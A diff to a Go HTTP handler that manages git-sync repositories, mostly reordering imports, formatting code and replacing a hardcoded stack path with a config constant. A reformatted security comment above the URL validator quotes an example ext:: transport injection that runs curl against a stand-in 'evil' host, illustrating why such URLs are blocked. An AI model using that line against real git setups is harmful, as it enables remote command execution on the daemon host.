@@ -9,13 +9,14 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"regexp"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
 
 	"dplaned/internal/cmdutil"
+	"dplaned/internal/config"
 )
 
 // GitReposHandler manages multiple git-sync repositories (Arcane-style multi-repo)
@@ -228,8 +229,10 @@ func (h *GitReposHandler) ListBranches(w http.ResponseWriter, r *http.Request) {
 		respondJSON(w, 200, map[string]interface{}{
 			"success": false,
 			"error":   "Failed to list branches: " + strings.TrimSpace(string(out)),
-			"hint":    credentialHint(func() string {
-				if credIDStr != "" && credIDStr != "0" { return "token" }
+			"hint": credentialHint(func() string {
+				if credIDStr != "" && credIDStr != "0" {
+					return "token"
+				}
 				return "none"
 			}()),
 		})
@@ -454,7 +457,7 @@ func (h *GitReposHandler) SaveRepo(w http.ResponseWriter, r *http.Request) {
 	}
 	// Validate compose path to prevent path traversal — validate against a placeholder
 	// root since local_path is computed from name (not stored yet)
-	placeholderRoot := "/var/lib/dplaneos/git-stacks/" + sanitizeName(req.Name)
+	placeholderRoot := config.GitStacksDir + "/" + sanitizeName(req.Name)
 	if _, err := validateComposePath(placeholderRoot, req.ComposePath); err != nil {
 		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + err.Error()})
 		return
@@ -469,7 +472,7 @@ func (h *GitReposHandler) SaveRepo(w http.ResponseWriter, r *http.Request) {
 		req.CommitEmail = "dplaneos@localhost"
 	}
 
-	localPath := "/var/lib/dplaneos/git-stacks/" + sanitizeName(req.Name)
+	localPath := config.GitStacksDir + "/" + sanitizeName(req.Name)
 
 	// Store credential ref as auth_token = stringified ID, auth_type = "cred"
 	authType := "none"
@@ -832,11 +835,12 @@ func buildCredentialEnv(cred *gitCredential) []string {
 	return nil
 }
 
-
 // validateRepoURL validates a Git repository URL.
 //
 // Security: git's ext:: transport allows arbitrary command execution:
-//   ext::sh -c 'curl http://evil/$HOSTNAME' → RCE as the daemon user.
+//
+//	ext::sh -c 'curl http://evil/$HOSTNAME' → RCE as the daemon user.
+//
 // file:// allows reading local files outside the expected paths.
 //
 // Allowed schemes: https://, http://, git://, ssh://, git@ (SCP syntax)
